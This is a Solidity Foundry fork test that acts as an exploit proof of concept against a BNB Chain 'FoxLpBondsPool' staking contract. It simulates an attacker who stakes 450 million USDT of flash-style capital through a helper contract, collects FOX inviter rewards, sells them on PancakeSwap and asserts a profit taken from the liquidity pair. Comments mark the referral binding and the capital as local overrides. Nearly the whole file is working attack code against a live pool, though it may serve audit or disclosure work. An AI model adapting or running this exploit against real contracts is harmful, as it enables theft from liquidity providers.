// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IFoxLpBondsPool {
    function treasury() external view returns (address);
    function referralAddress() external view returns (address);
    function logAddress() external view returns (address);
    function usdtToken() external view returns (address);
    function foxToken() external view returns (address);
    function lpFoxToken() external view returns (address);
    function swapRouter() external view returns (address);
    function stakeDays() external view returns (uint256);
    function getSwapPrice(uint256) external view returns (uint256, uint256);
    function stake(uint256, uint256) external;
    function stakeInfoMap(uint256) external view returns (
        uint256, address, uint256, uint256, uint256, uint256,
        uint256, uint256, uint256, uint256, uint256
    );
}

interface IReferral {
    function owner() external view returns (address);
    function rootAddress() external view returns (address);
    function referralMap(address) external view returns (address);
    function setReferral(address, address) external;
}

interface ILog {
    function getBlockIdListCount() external view returns (uint256);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external returns (uint[] memory);
}

contract StakerHelper {
    function bond(address pool, address usdt, uint256 amount)
        external
        returns (bool ok, bytes memory reason)
    {
        IERC20(usdt).approve(pool, amount);
        try IFoxLpBondsPool(pool).stake(amount, type(uint256).max) {
            ok = true;
        } catch (bytes memory errorData) {
            reason = errorData;
        }
        // Return both normal addLiquidity refunds and funds left after a caught revert.
        uint256 leftover = IERC20(usdt).balanceOf(address(this));
        if (leftover != 0) IERC20(usdt).transfer(msg.sender, leftover);
    }
}

contract FoxCurrentForkTest is Test {
    uint256 internal constant WAR_CHEST = 450_000_000 ether;

    IFoxLpBondsPool internal pool;
    IReferral internal referral;
    address internal usdt;
    address internal fox;
    address internal pair;
    address internal router;
    address internal attacker;
    StakerHelper internal staker;

    struct Result {
        bool stakeOk;
        bool saleOk;
        bytes reason;
        uint256 stakeAmount;
        uint256 inviterFox;
        uint256 quoteBefore;
        uint256 quoteAfter;
        uint256 usdtAfter;
        int256 pnlUsdt;
        int256 pairUsdtDelta;
    }

    function setUp() public {
        // Required: exact block chosen by the caller. No hidden latest-block fallback.
        vm.createSelectFork(vm.envString("BSC_ARCHIVE_RPC"), vm.envUint("PIN"));

        // Same ABI can be reused for another candidate pool by changing POOL.
        pool = IFoxLpBondsPool(vm.envAddress("POOL"));
        referral = IReferral(pool.referralAddress());
        usdt = pool.usdtToken();
        fox = pool.foxToken();
        pair = pool.lpFoxToken();
        router = pool.swapRouter();

        attacker = makeAddr("fox-test-attacker");
        staker = new StakerHelper();

        require(referral.referralMap(attacker) == address(0), "test inviter already bound");
        require(referral.referralMap(address(staker)) == address(0), "test staker already bound");

        // LOCAL STATE OVERRIDE: referral owner setup is used only to test the stake
        // mechanism. A real attacker still needs an existing binding or project-signer
        // signature. A positive result is conditional on that referral prerequisite.
        _bind(attacker, referral.rootAddress());
        _bind(address(staker), attacker);
    }

    function _bind(address user, address inviter) internal {
        vm.prank(referral.owner());
        referral.setReferral(user, inviter);
    }

    function _execute() internal returns (Result memory result) {
        // LOCAL STATE OVERRIDE: stand-in for flash liquidity, not proof that this
        // amount is currently borrowable. P&L excludes flash-loan fees and gas.
        deal(usdt, attacker, WAR_CHEST);

        uint256 stakeId = ILog(pool.logAddress()).getBlockIdListCount();
        uint256 pairBefore = IERC20(usdt).balanceOf(pair);
        (result.quoteBefore,) = pool.getSwapPrice(0);

        vm.prank(attacker);
        IERC20(usdt).transfer(address(staker), WAR_CHEST);

        vm.prank(attacker);
        (result.stakeOk, result.reason) = staker.bond(address(pool), usdt, WAR_CHEST);

        if (result.stakeOk) {
            (,,,,, result.stakeAmount,,,,,) = pool.stakeInfoMap(stakeId);
            result.inviterFox = IERC20(fox).balanceOf(attacker);
        }
        (result.quoteAfter,) = pool.getSwapPrice(0);

        if (result.stakeOk && result.inviterFox != 0) {
            address[] memory path = new address[](2);
            path[0] = fox;
            path[1] = usdt;
            vm.startPrank(attacker);
            IERC20(fox).approve(router, result.inviterFox);
            try IPancakeRouter(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                result.inviterFox, 1, path, attacker, block.timestamp
            ) {
                result.saleOk = true;
            } catch (bytes memory errorData) {
                result.reason = errorData;
            }
            vm.stopPrank();
        } else if (result.stakeOk) {
            result.reason = bytes("NO_LIQUID_INVITER_REWARD");
        }

        result.usdtAfter = IERC20(usdt).balanceOf(attacker);
        result.pnlUsdt = int256(result.usdtAfter) - int256(WAR_CHEST);
        result.pairUsdtDelta = int256(IERC20(usdt).balanceOf(pair)) - int256(pairBefore);
    }

    function _report(Result memory r) internal view {
        console2.log("FORK_BLOCK", block.number);
        console2.log("POOL", address(pool));
        console2.log("TREASURY", pool.treasury());
        console2.log("PAIR", pair);
        console2.log("STAKE_DAYS", pool.stakeDays());
        console2.log("STAKE_OK", r.stakeOk);
        console2.log("SALE_OK", r.saleOk);
        console2.log("REVERT_OR_STATUS_REASON");
        console2.logBytes(r.reason);
        console2.log("QUOTE_BEFORE_RAW", r.quoteBefore);
        console2.log("QUOTE_AFTER_RAW", r.quoteAfter);
        console2.log("STAKE_AMOUNT_FOX_RAW", r.stakeAmount);
        console2.log("INVITER_FOX_RAW", r.inviterFox);
        console2.log("ATTACKER_USDT_AFTER_RAW", r.usdtAfter);
        console2.log("ATTACKER_PNL_USDT_RAW_SIGNED");
        console2.logInt(r.pnlUsdt);
        console2.log("PAIR_USDT_DELTA_RAW_SIGNED");
        console2.logInt(r.pairUsdtDelta);
        console2.log("MODEL_ONLY: deal() capital + referral-owner override; fees/gas excluded");
    }

    // Always prints status. A revert/nonprofit does NOT prove a patch; inspect reason/config.
    function test_current_status() public {
        _report(_execute());
    }

    // Passes only if the whole current-state path succeeds and gross model P&L is positive.
    function test_current_exploit_requires_positive_pnl() public {
        Result memory r = _execute();
        _report(r);
        assertTrue(r.stakeOk, "stake reverted");
        assertTrue(r.saleOk, "FOX sale reverted/no liquid reward");
        assertTrue(r.pnlUsdt > 0, "no positive gross model P&L");
        assertEq(r.pairUsdtDelta, -r.pnlUsdt, "USDT conservation mismatch");
    }
}
